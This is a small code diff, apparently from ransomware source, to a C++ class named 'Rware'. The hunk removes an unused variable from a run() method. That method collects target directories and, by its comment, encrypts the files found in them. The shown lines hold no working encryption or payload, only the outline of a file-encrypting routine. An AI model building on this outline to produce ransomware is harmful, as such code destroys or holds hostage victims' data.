@@ -102,7 +102,6 @@ class Rware{
         }
         void run(){ //For in target files and call encrypt on them  
             fill_dirs();
-            string answer;
             for(vector<string>::iterator it=targetDirs->begin();it!=targetDirs->end();it++){
                 fill_targets(*it);
             }
